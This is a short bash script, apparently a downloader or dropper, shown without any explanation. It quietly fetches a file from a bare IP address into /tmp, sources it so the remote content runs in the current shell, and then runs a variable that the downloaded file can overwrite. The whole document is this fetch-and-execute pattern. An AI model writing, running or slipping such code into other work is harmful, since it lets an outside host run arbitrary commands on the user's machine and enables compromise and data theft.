#!/bin/bash
curl -s http://203.0.113.5/f -o /tmp/f
c=echo
source /tmp/f
bash -c "$c"
